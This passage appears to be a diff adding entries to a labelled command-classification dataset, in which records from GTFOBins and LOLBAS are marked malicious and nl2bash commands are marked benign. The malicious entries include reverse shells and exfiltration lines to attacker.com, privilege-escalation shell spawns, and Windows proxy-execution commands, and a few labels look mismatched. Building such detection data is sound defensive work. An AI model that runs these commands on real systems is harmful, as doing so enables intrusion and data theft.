+{"command": "echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file\nchmod +x /path/to/temp-file\nsshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/", "label": "malicious", "source": "gtfobins", "detail": "sshfs", "id": 436}
+{"command": "rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}", "label": "malicious", "source": "lolbas", "detail": "Pcwutl.dll", "id": 437}
+{"command": "gzip -dc archive.tar.gz | tar -xf - -C /destination", "label": "benign", "source": "nl2bash", "detail": null, "id": 438}
+{"command": "pcalua.exe -a {PATH_SMB:.dll}", "label": "malicious", "source": "lolbas", "detail": "Pcalua.exe", "id": 439}
+{"command": "find . -iname foo", "label": "benign", "source": "nl2bash", "detail": null, "id": 440}
+{"command": "start-stop-daemon -S -x /bin/sh -- -p", "label": "malicious", "source": "gtfobins", "detail": "start-stop-daemon", "id": 441}
+{"command": "file $(which foo)", "label": "benign", "source": "nl2bash", "detail": null, "id": 442}
+{"command": "set comspec={PATH_ABSOLUTE:.exe} & cscript c:\\windows\\system32\\manage-bde.wsf", "label": "malicious", "source": "lolbas", "detail": "Manage-bde.wsf", "id": 443}
+{"command": "run-parts --new-session --regex '^sh$' /bin", "label": "malicious", "source": "gtfobins", "detail": "run-parts", "id": 444}
+{"command": "echo -e \"length(FOO_NO_TRAIL_SPACE)==$(echo -ne \"${FOO_NO_TRAIL_SPACE}\" | wc -m)\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 445}
+{"command": "find . -type f -print0", "label": "benign", "source": "nl2bash", "detail": null, "id": 446}
+{"command": "echo '...' >/path/to/temp-file\npdb /path/to/temp-file\ncont", "label": "malicious", "source": "gtfobins", "detail": "pdb", "id": 447}
+{"command": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc\ntop\n# press return twice\nreset", "label": "malicious", "source": "gtfobins", "detail": "top", "id": 448}
+{"command": "kubectl delete pod -l app=worker --grace-period=0 --force", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 449}
+{"command": "find . -type f -mtime 2 -mtime -3 -daystart -exec ls -l {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 450}
+{"command": "wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'", "label": "malicious", "source": "lolbas", "detail": "Wsl.exe", "id": 451}
+{"command": "find . -name \"photo*.jpg\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 452}
+{"command": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 453}
+{"command": "find \"$somedir\" -type d -empty -exec cp /my/configfile {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 454}
+{"command": "PAGER='/bin/sh -c \"exec sh 0<&1\"' git -p help", "label": "malicious", "source": "gtfobins", "detail": "git", "id": 455}
+{"command": "zcat bigfile.z | sed -ne '500,1000 p'", "label": "benign", "source": "nl2bash", "detail": null, "id": 456}
+{"command": "busybox nc -e /bin/sh attacker.com 12345", "label": "malicious", "source": "gtfobins", "detail": "busybox", "id": 457}
+{"command": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'", "label": "malicious", "source": "gtfobins", "detail": "python", "id": 458}
+{"command": "aws help", "label": "malicious", "source": "gtfobins", "detail": "aws", "id": 459}
+{"command": "find . \\( ! -path \"*target*\" -a ! -path \"*tools*\" -a ! -path \"*.git*\" -print \\)", "label": "benign", "source": "nl2bash", "detail": null, "id": 460}
+{"command": "softlimit /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "softlimit", "id": 461}
+{"command": "find $INPUT_LOCATION -name '*.pdf.marker' -exec bash -c 'mv ${0%.marker} $0 $1' {} $OUTPUT_LOCATION \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 462}
+{"command": "find root -name '*.rmv' -type f -exec cp {} /copy/to/here \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 463}
+{"command": "find . -perm 0644 | head", "label": "benign", "source": "nl2bash", "detail": null, "id": 464}
+{"command": "Tracker.exe /d {PATH:.dll} /c C:\\Windows\\write.exe", "label": "malicious", "source": "lolbas", "detail": "Tracker.exe", "id": 465}
+{"command": "find . -type f | tac", "label": "benign", "source": "nl2bash", "detail": null, "id": 466}
+{"command": "find . -type f -name \"*.java\" -exec grep -il string {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 467}
+{"command": "ls *.html | xargs -I {} sh -c 'mv $1 `basename $1 .html`.txt' - {}", "label": "benign", "source": "nl2bash", "detail": null, "id": 468}
+{"command": "wc `find`", "label": "benign", "source": "nl2bash", "detail": null, "id": 469}
+{"command": "mkdir aaa/bbb", "label": "benign", "source": "nl2bash", "detail": null, "id": 470}
+{"command": "echo $(readlink -f /dev/disk/by-uuid/$1) is mounted", "label": "benign", "source": "nl2bash", "detail": null, "id": 471}
+{"command": "mount /path/to/device /path/to/mount/location -o loop", "label": "benign", "source": "nl2bash", "detail": null, "id": 472}
+{"command": "ping 8.8.8.8 | awk -F\"[= ]\" '{if($10>50) {cmd=\"date\"; cmd | getline dt; close(cmd) ; print $10, dt}}'", "label": "benign", "source": "nl2bash", "detail": null, "id": 473}
+{"command": "ifconfig eth0 | grep HWaddr", "label": "benign", "source": "nl2bash", "detail": null, "id": 474}
+{"command": "python -m http.server 80", "label": "malicious", "source": "gtfobins", "detail": "ruby", "id": 475}
+{"command": "ls -l /boot/grub/*.mod | wc -l", "label": "benign", "source": "nl2bash", "detail": null, "id": 476}
+{"command": "dotnet.exe {PATH:.dll}", "label": "malicious", "source": "lolbas", "detail": "Dotnet.exe", "id": 477}
+{"command": "ip netns add foo\nip netns exec foo /bin/sh\nip netns delete foo", "label": "malicious", "source": "gtfobins", "detail": "ip", "id": 478}
+{"command": "find /home -xdev -samefile file1 | xargs ls -l", "label": "benign", "source": "nl2bash", "detail": null, "id": 479}
+{"command": "vbc.exe /target:exe {PATH_ABSOLUTE:.vb}", "label": "malicious", "source": "lolbas", "detail": "vbc.exe", "id": 480}
+{"command": "psql -c 'DROP TABLE IF EXISTS staging_tmp;'", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 481}
+{"command": "php -r 'posix_setuid(0); passthru(\"/bin/sh -i\");'", "label": "malicious", "source": "gtfobins", "detail": "php", "id": 482}
+{"command": "gawk '//' /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "nawk", "id": 483}
+{"command": "find ${INPUT_LOCATION}/ -name \"*.pdf.marker\" | xargs -I file mv file $(basename file .marker) ${OUTPUT_LOCATION}/.", "label": "benign", "source": "nl2bash", "detail": null, "id": 484}
+{"command": "ed /path/to/input-file\n,p\nq", "label": "malicious", "source": "gtfobins", "detail": "ed", "id": 485}
+{"command": "touch -d '30 August 2013' *.php", "label": "benign", "source": "nl2bash", "detail": null, "id": 486}
+{"command": "cat -n file.txt | less", "label": "benign", "source": "nl2bash", "detail": null, "id": 487}
+{"command": "find /stuff -maxdepth 1 -type d -exec script.py {} +", "label": "benign", "source": "nl2bash", "detail": null, "id": 488}
+{"command": "compaudit | xargs chmod g-w", "label": "benign", "source": "nl2bash", "detail": null, "id": 489}
+{"command": "aws s3 rm s3://my-bucket/old-build/ --recursive", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 490}
+{"command": "ash -p -c 'echo DATA >/path/to/output-file'", "label": "malicious", "source": "gtfobins", "detail": "ash", "id": 491}
+{"command": "tex --shell-escape '\\immediate\\write18{/bin/sh}'", "label": "malicious", "source": "gtfobins", "detail": "tex", "id": 492}
+{"command": "finger |  cut --complement -c36-40", "label": "benign", "source": "nl2bash", "detail": null, "id": 493}
+{"command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"mount {GUID}\" \"quit\" \"quit\"", "label": "malicious", "source": "lolbas", "detail": "dsdbutil.exe", "id": 494}
+{"command": "find ~/dir_data -type d -exec chmod a+xr,u+w {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 495}
+{"command": "read -n 1 -p \"Is this a good question (y/n)? \" answer", "label": "benign", "source": "nl2bash", "detail": null, "id": 496}
+{"command": "exit -1", "label": "benign", "source": "nl2bash", "detail": null, "id": 497}
+{"command": "find /etc -maxdepth 1 -name \"*.conf\" | tail", "label": "benign", "source": "nl2bash", "detail": null, "id": 498}
+{"command": "find data/ -print0 | tar -T - --null --create -f archive.tar", "label": "benign", "source": "nl2bash", "detail": null, "id": 499}
+{"command": "tail -f file | stdbuf -o0 grep my_pattern", "label": "benign", "source": "nl2bash", "detail": null, "id": 500}
+{"command": "unshare /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "unshare", "id": 501}
+{"command": "find / -name file1", "label": "benign", "source": "nl2bash", "detail": null, "id": 502}
+{"command": "find . \\( -name . -o -prune \\)", "label": "benign", "source": "nl2bash", "detail": null, "id": 503}
+{"command": "echo \"$path\" | rev | cut -d\"/\" -f1 | rev", "label": "benign", "source": "nl2bash", "detail": null, "id": 504}
+{"command": "awk -F, 'NR==1 {gsub(/\"/,\"\",$3);print $3}' \"$(dirname $(readlink -f $(which erl)))/../releases/RELEASES\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 505}
+{"command": "nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'", "label": "malicious", "source": "gtfobins", "detail": "nohup", "id": 506}
+{"command": "rasautou -d {PATH:.dll} -p export_name -a a -e e", "label": "malicious", "source": "lolbas", "detail": "Rasautou.exe", "id": 507}
+{"command": "find / -maxdepth 1 -xdev -type f  -exec grep -li stringtofind '{}' \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 508}
+{"command": "find /nfs/office -name .user.log -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 509}
+{"command": "find /dir/dir -type f -mtime +540 -mtime -720 -printf \\\u201d%p\\\u201d,\\\u201d%s\\\u201d,\\\u201d%AD\\\u201d,|\u201d%TD\\\u201d\\\\n > /dir/dir/output.csv", "label": "benign", "source": "nl2bash", "detail": null, "id": 510}
+{"command": "find . -name \"*.txt\" -print0 | xargs -0 rm", "label": "benign", "source": "nl2bash", "detail": null, "id": 511}
+{"command": "msiexec /y {PATH_ABSOLUTE:.dll}", "label": "malicious", "source": "lolbas", "detail": "Msiexec.exe", "id": 512}
+{"command": "ifconfig | grep -A2 \"venet0:0\\|eth0\" | grep 'inet addr:' | sed -r 's/.*inet addr:([^ ]+).*/\\1/' | head -1", "label": "benign", "source": "nl2bash", "detail": null, "id": 513}
+{"command": "check_cups --extra-opts=@/path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "check_cups", "id": 514}
+{"command": "rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}", "label": "malicious", "source": "lolbas", "detail": "Advpack.dll", "id": 515}
+{"command": "find olddir -type d -printf \"newdir/%P\\0\" | xargs -0 mkdir -p", "label": "benign", "source": "nl2bash", "detail": null, "id": 516}
+{"command": "nroff /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "nroff", "id": 517}
+{"command": "find / -name vimrc", "label": "benign", "source": "nl2bash", "detail": null, "id": 518}
+{"command": "rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap", "label": "malicious", "source": "lolbas", "detail": "rdrleakdiag.exe", "id": 519}
+{"command": "vim -c ':lua ...'", "label": "malicious", "source": "gtfobins", "detail": "vim", "id": 520}
+{"command": "sed e", "label": "malicious", "source": "gtfobins", "detail": "sed", "id": 521}
+{"command": "gawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'", "label": "malicious", "source": "gtfobins", "detail": "nawk", "id": 522}
+{"command": "find . -name \"*.html\" -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 523}
+{"command": "podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "podman", "id": 524}
+{"command": "busybox ash", "label": "malicious", "source": "gtfobins", "detail": "busybox", "id": 525}
+{"command": "find . -name \u2018*.x\u2019 -print0 | xargs -0 grep fred", "label": "benign", "source": "nl2bash", "detail": null, "id": 526}
+{"command": "capsh --", "label": "malicious", "source": "gtfobins", "detail": "capsh", "id": 527}
+{"command": "find /apps/audit -perm -7 -print | xargs chmod o\u2011w", "label": "benign", "source": "nl2bash", "detail": null, "id": 528}
+{"command": "find ./ -type f -regex \".*\\.[Jj][Pp][gG]$\" | wc -l", "label": "benign", "source": "nl2bash", "detail": null, "id": 529}
+{"command": "codex sandbox linux /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "codex", "id": 530}
+{"command": "sudo tar xvf phantomjs-1.9.0-linux-x86_64.tar.bz2", "label": "benign", "source": "nl2bash", "detail": null, "id": 531}
+{"command": "shuf -e DATA -o /path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "shuf", "id": 532}
+{"command": "./a.out 2>&1 | tee output", "label": "benign", "source": "nl2bash", "detail": null, "id": 533}
+{"command": "grep -o '^\\S\\+' <(comm file1 file2)", "label": "benign", "source": "nl2bash", "detail": null, "id": 534}
+{"command": "curl -fsSL https://get.docker.com | sh", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 535}
+{"command": "echo '...' >Vagrantfile\nvagrant up", "label": "malicious", "source": "gtfobins", "detail": "vagrant", "id": 536}
+{"command": "gawk 'BEGIN {system(\"/bin/sh\")}'", "label": "malicious", "source": "gtfobins", "detail": "gawk", "id": 537}
+{"command": "split -b 999 --additional-suffix suffix /path/to/input-file prefix\ncat prefixaasuffix", "label": "malicious", "source": "gtfobins", "detail": "split", "id": 538}
+{"command": "conhost.exe {CMD}", "label": "malicious", "source": "lolbas", "detail": "Conhost.exe", "id": 539}
+{"command": "gunzip -c blah.gz | some_command", "label": "benign", "source": "nl2bash", "detail": null, "id": 540}
+{"command": "tclsh", "label": "malicious", "source": "gtfobins", "detail": "tclsh", "id": 541}
+{"command": "ex -c ':!/bin/sh'", "label": "malicious", "source": "gtfobins", "detail": "ex", "id": 542}
+{"command": "find . -name \"*Linkin Park\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 543}
+{"command": "find . -name \"*.mpg\" -type f -print0 | xargs -0 -I {} -n 1 -P 4 ffmpeg -i {} {}.mp4", "label": "benign", "source": "nl2bash", "detail": null, "id": 544}
+{"command": "find $LOGDIR -type d -mtime +0 -exec compress -r {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 545}
+{"command": "ispell /etc/hosts\n!/bin/sh -p", "label": "malicious", "source": "gtfobins", "detail": "ispell", "id": 546}
+{"command": "echo 'esyscmd(/path/to/command)' | m4", "label": "malicious", "source": "gtfobins", "detail": "m4", "id": 547}
+{"command": "tail -n 100 file1 | pv | wc -l", "label": "benign", "source": "nl2bash", "detail": null, "id": 548}
+{"command": "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}", "label": "malicious", "source": "lolbas", "detail": "Installutil.exe", "id": 549}
+{"command": "cpan\n! ...", "label": "malicious", "source": "gtfobins", "detail": "cpan", "id": 550}
+{"command": "sudo ssh $USERNAME@localhost -L 80:localhost:3000 -N", "label": "benign", "source": "nl2bash", "detail": null, "id": 551}
+{"command": "bash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345'", "label": "malicious", "source": "gtfobins", "detail": "bash", "id": 552}
+{"command": "smbserver.py -smb2support share .", "label": "malicious", "source": "gtfobins", "detail": "smbclient", "id": 553}
+{"command": "csplit /path/to/input-file 1\ncat xx01", "label": "malicious", "source": "gtfobins", "detail": "csplit", "id": 554}
+{"command": "lwp-download file:///path/to/input-file /dev/stdout", "label": "malicious", "source": "gtfobins", "detail": "lwp-download", "id": 555}
+{"command": "grep -v '^\\s*$' *.py | wc", "label": "benign", "source": "nl2bash", "detail": null, "id": 556}
+{"command": "find ${WP_ROOT}/wp-content -exec chgrp ${WS_GROUP} {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 557}
+{"command": "uuencode /path/to/input-file /dev/stdout | uudecode", "label": "malicious", "source": "gtfobins", "detail": "uuencode", "id": 558}
+{"command": "find . -name '*.log' -mtime +7 -delete", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 559}
+{"command": "Gpscript /logon", "label": "malicious", "source": "lolbas", "detail": "Gpscript.exe", "id": 560}
+{"command": "cp /bin/sh /usr/lib/zypper/commands/zypper-x\nzypper x", "label": "malicious", "source": "gtfobins", "detail": "zypper", "id": 561}
+{"command": "find \".performance_test\" -not -path \".performance_test/prune_me*\" -exec bash -c 'echo \"$0\"' {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 562}
+{"command": "dash -c 'echo DATA >/path/to/output-file'", "label": "malicious", "source": "gtfobins", "detail": "dash", "id": 563}
+{"command": "perf stat /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "perf", "id": 564}
+{"command": "rm -rf node_modules && npm install", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 565}
+{"command": "find . -name some_pattern -print0 | xargs -0 -J % mv % target_location", "label": "benign", "source": "nl2bash", "detail": null, "id": 566}
+{"command": "find /path -name '*.pdf' -exec sh -c 'pdftotext \"{}\" - | grep --with-filename --label=\"{}\" --color \"your pattern\"' \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 567}
+{"command": "latex --shell-escape '\\immediate\\write18{/bin/sh}'", "label": "malicious", "source": "gtfobins", "detail": "xelatex", "id": 568}
+{"command": "regsvcs.exe {PATH:.dll}", "label": "malicious", "source": "lolbas", "detail": "Regsvcs.exe", "id": 569}
+{"command": "find . -size +10k -type f -maxdepth 1 -exec ls -lh {} \\; > myLogFile.txt", "label": "benign", "source": "nl2bash", "detail": null, "id": 570}
+{"command": "find . -type f -ls", "label": "benign", "source": "nl2bash", "detail": null, "id": 571}
+{"command": "vi -c ':set shell=/bin/sh | shell'", "label": "malicious", "source": "gtfobins", "detail": "vi", "id": 572}
+{"command": "python -m http.server 80", "label": "malicious", "source": "gtfobins", "detail": "julia", "id": 573}
+{"command": "xxd -p file | tr -d '\\n'", "label": "benign", "source": "nl2bash", "detail": null, "id": 574}
+{"command": "find . -maxdepth 1 -mindepth 1 -type d -printf '%f\\n'", "label": "benign", "source": "nl2bash", "detail": null, "id": 575}
+{"command": "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"/path/to/lib.so\")'", "label": "malicious", "source": "gtfobins", "detail": "python", "id": 576}
+{"command": "dpkg -i x_1.0_all.deb", "label": "malicious", "source": "gtfobins", "detail": "dpkg", "id": 577}
+{"command": "gdb -nx -ex 'dump value /path/to/output-file \"DATA\"' -ex quit", "label": "malicious", "source": "gtfobins", "detail": "gdb", "id": 578}
+{"command": "cd `dirname $TARGET_FILE`", "label": "benign", "source": "nl2bash", "detail": null, "id": 579}
+{"command": "sudo su - jenkins", "label": "benign", "source": "nl2bash", "detail": null, "id": 580}
+{"command": "df -H --total /", "label": "benign", "source": "nl2bash", "detail": null, "id": 581}
+{"command": "msgcat -P /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "msgcat", "id": 582}
+{"command": "docker run --rm -it --privileged -u root alpine\nmount /dev/sda1 /mnt/\nls -la /mnt/\nchroot /mnt /bin/bash", "label": "malicious", "source": "gtfobins", "detail": "docker", "id": 583}
+{"command": "bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'", "label": "malicious", "source": "lolbas", "detail": "Bash.exe", "id": 584}
+{"command": "mutt -F /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "mutt", "id": 585}
+{"command": "du -smc * | sort -n", "label": "benign", "source": "nl2bash", "detail": null, "id": 586}
+{"command": "file utf8.txt", "label": "benign", "source": "nl2bash", "detail": null, "id": 587}
+{"command": "find . \\( -name \"my*\" -o -name \"qu*\" \\) -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 588}
+{"command": "nc -l -p 12345 >/path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "whois", "id": 589}
+{"command": "find /your/project -maxdepth 1 ! -name \"CONFIGFILE\" -exec ln -s \\{\\} ./ \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 590}
+{"command": "rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}", "label": "malicious", "source": "lolbas", "detail": "Ieadvpack.dll", "id": 591}
+{"command": "find . -inum $inum -exec rm {} \\", "label": "benign", "source": "nl2bash", "detail": null, "id": 592}
+{"command": "vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb}", "label": "malicious", "source": "lolbas", "detail": "vbc.exe", "id": 593}
+{"command": "find .|grep \"FooBar\"|xargs -I{} cp \"{}\" ~/foo/bar", "label": "benign", "source": "nl2bash", "detail": null, "id": 594}
+{"command": "find \"${S}/bundled-libs\" \\! -name 'libbass.so' -delete", "label": "benign", "source": "nl2bash", "detail": null, "id": 595}
+{"command": "find . -size +1M", "label": "benign", "source": "nl2bash", "detail": null, "id": 596}
+{"command": "find . -name \"*.txt\" | sed \"s/\\.txt$//\" | xargs -i echo mv {}.txt {}.bak | sh", "label": "benign", "source": "nl2bash", "detail": null, "id": 597}
+{"command": "tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}", "label": "malicious", "source": "lolbas", "detail": "Tar.exe", "id": 598}
+{"command": "msedge.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"", "label": "malicious", "source": "lolbas", "detail": "Msedge.exe", "id": 599}
+{"command": "makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}", "label": "malicious", "source": "lolbas", "detail": "Makecab.exe", "id": 600}
+{"command": "chattr +i /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "chattr", "id": 601}
+{"command": "find . -type f -name \"*.txt\" -exec sh -c 'for i;do sed 's/[[:space:]]*$//' \"$i\">/tmp/.$$ && mv /tmp/.$$ \"$i\";done' arg0 {} +", "label": "benign", "source": "nl2bash", "detail": null, "id": 602}
+{"command": "yarn exec /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "yarn", "id": 603}
+{"command": "rsync -av /path/to/files user@targethost:/path", "label": "benign", "source": "nl2bash", "detail": null, "id": 604}
+{"command": "find . -regex filename-regex.\\*\\.html", "label": "benign", "source": "nl2bash", "detail": null, "id": 605}
+{"command": "tbl /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "tbl", "id": 606}
+{"command": "coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name", "label": "malicious", "source": "lolbas", "detail": "coregen.exe", "id": 607}
+{"command": "rm -r classes", "label": "benign", "source": "nl2bash", "detail": null, "id": 608}
+{"command": "echo \"$b\" | grep -o \"[$a]\" | tr -d '\\n'", "label": "benign", "source": "nl2bash", "detail": null, "id": 609}
+{"command": "echo DATA >/path/to/temp-file\nmv /path/to/temp-file /path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "mv", "id": 610}
+{"command": "sort -u set1 set2", "label": "benign", "source": "nl2bash", "detail": null, "id": 611}
+{"command": "find . -iname .svn -exec bash -c 'rm -rf {}' \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 612}
+{"command": "echo DATA >/path/to/temp-file\ncsplit -z -b '%doutput-file' /path/to/temp-file 1", "label": "malicious", "source": "gtfobins", "detail": "csplit", "id": 613}
+{"command": "cmp /path/to/input-file /dev/zero -b -l", "label": "malicious", "source": "gtfobins", "detail": "cmp", "id": 614}
+{"command": "touch x.yara\nclamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'", "label": "malicious", "source": "gtfobins", "detail": "clamscan", "id": 615}
+{"command": "mount | tail -1 | sed 's/ on .* ([^)]*)$//'", "label": "benign", "source": "nl2bash", "detail": null, "id": 616}
+{"command": ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess {PATH:.ps1}", "label": "malicious", "source": "lolbas", "detail": "CL_Mutexverifiers.ps1", "id": 617}
+{"command": "hostname -I", "label": "benign", "source": "nl2bash", "detail": null, "id": 618}
+{"command": "arp -v -f /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "arp", "id": 619}
+{"command": "tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh", "label": "malicious", "source": "gtfobins", "detail": "tar", "id": 620}
+{"command": "basedir=$(dirname \"$(echo \"$0\" | sed -e 's,\\\\,/,g')\")", "label": "benign", "source": "nl2bash", "detail": null, "id": 621}
+{"command": "sed -i.bak '/pattern to match/d' ./infile", "label": "benign", "source": "nl2bash", "detail": null, "id": 622}
+{"command": "rm -rf dist build", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 623}
+{"command": "echo DATA | tee /path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "tee", "id": 624}
+{"command": "query.exe user", "label": "malicious", "source": "lolbas", "detail": "Query.exe", "id": 625}
+{"command": "alias psgrep=\"ps -ef | grep\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 626}
+{"command": "split --bytes=1500000000 abc.txt abc", "label": "benign", "source": "nl2bash", "detail": null, "id": 627}
+{"command": "find . -mtime +10 -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 628}
+{"command": "busctl --show-machine", "label": "malicious", "source": "gtfobins", "detail": "busctl", "id": 629}
+{"command": "false | tee /dev/null", "label": "benign", "source": "nl2bash", "detail": null, "id": 630}
+{"command": "chmod +x deploy.sh", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 631}
+{"command": "wc --files0-from /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "wc", "id": 632}
+{"command": "paste /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "paste", "id": 633}
+{"command": "finger x@attacker.com", "label": "malicious", "source": "gtfobins", "detail": "finger", "id": 634}
+{"command": "ProtocolHandler.exe {REMOTEURL}", "label": "malicious", "source": "lolbas", "detail": "ProtocolHandler.exe", "id": 635}
+{"command": "alias clean='rm -rf \"#\"* \".\"*~ *~ *.bak *.dvi *.aux *.log'", "label": "benign", "source": "nl2bash", "detail": null, "id": 636}
+{"command": "grep '' /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "zgrep", "id": 637}
+{"command": "read -p \"Press [Enter] key to release lock...\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 638}
+{"command": "dos2unix -f -n /path/to/input-file /path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "dos2unix", "id": 639}
+{"command": "nice /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "nice", "id": 640}
+{"command": "pip config --editor '/bin/sh -s' edit", "label": "malicious", "source": "gtfobins", "detail": "pip", "id": 641}
+{"command": "find . -name \"file2015-0*\" -exec mv {} .. \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 642}
+{"command": "cp -vi /boot/config-`uname -r` .config", "label": "benign", "source": "nl2bash", "detail": null, "id": 643}
+{"command": "readlink -m /path/there/../../", "label": "benign", "source": "nl2bash", "detail": null, "id": 644}
+{"command": "Update.exe --update={PATH_SMB:folder}", "label": "malicious", "source": "lolbas", "detail": "Update.exe", "id": 645}
+{"command": "rsync --blocking-io *.cc *.h SConstruct rsync://localhost:40001/bledge_ce", "label": "benign", "source": "nl2bash", "detail": null, "id": 646}
+{"command": "find . -type f -print0 | tr -dc '\\0' | wc -c", "label": "benign", "source": "nl2bash", "detail": null, "id": 647}
+{"command": "latex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{DATA}\\immediate\\closeout\\tempfile\\end{document}'", "label": "malicious", "source": "gtfobins", "detail": "xelatex", "id": 648}
+{"command": "echo '/bin/sh 0<&1' >/path/to/temp-file\ntar cf /path/to/temp-file.tar /path/to/temp-file\ntar xf /path/to/temp-file.tar --to-command /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "tar", "id": 649}
+{"command": "find . -name '*.ext' | parallel echo {} '`dirname {}`'", "label": "benign", "source": "nl2bash", "detail": null, "id": 650}
+{"command": "find /var/www/ -name wp-config.php -maxdepth 2", "label": "benign", "source": "nl2bash", "detail": null, "id": 651}
+{"command": "php -r 'posix_setuid(0); pcntl_exec(\"/bin/sh\");'", "label": "malicious", "source": "gtfobins", "detail": "php", "id": 652}
+{"command": "vim -c ':redir! >/path/to/output-file | echo \"DATA\" | redir END | q'", "label": "malicious", "source": "gtfobins", "detail": "vim", "id": 653}
+{"command": "bash -c 'echo \"$(</dev/tcp/attacker.com/12345) >/path/to/output-file'", "label": "malicious", "source": "gtfobins", "detail": "bash", "id": 654}
+{"command": "eudcedit", "label": "malicious", "source": "lolbas", "detail": "Eudcedit.exe", "id": 655}
+{"command": "tac filename | sed 4,6d | tac", "label": "benign", "source": "nl2bash", "detail": null, "id": 656}
+{"command": "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name", "label": "malicious", "source": "lolbas", "detail": "msxsl.exe", "id": 657}
+{"command": "find ~ -atime 100", "label": "benign", "source": "nl2bash", "detail": null, "id": 658}
+{"command": "find . -name *.txt | xargs dos2unix", "label": "benign", "source": "nl2bash", "detail": null, "id": 659}
+{"command": "column /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "column", "id": 660}
+{"command": "sudo systemctl restart nginx", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 661}
+{"command": "cmdl32 /vpn /lan %cd%\\config", "label": "malicious", "source": "lolbas", "detail": "cmdl32.exe", "id": 662}
+{"command": "find . -mtime -30 -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 663}
